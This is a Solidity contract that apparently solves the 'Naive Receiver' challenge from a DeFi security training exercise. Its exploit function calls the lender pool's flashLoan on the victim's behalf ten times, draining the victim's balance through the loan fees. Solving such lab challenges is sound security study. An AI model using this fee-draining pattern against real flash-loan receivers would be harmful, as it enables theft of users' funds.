pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {
    using Address for address payable;

    function exploit(NaiveReceiverLenderPool pool, address victim) external {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0);
        }
    }
}
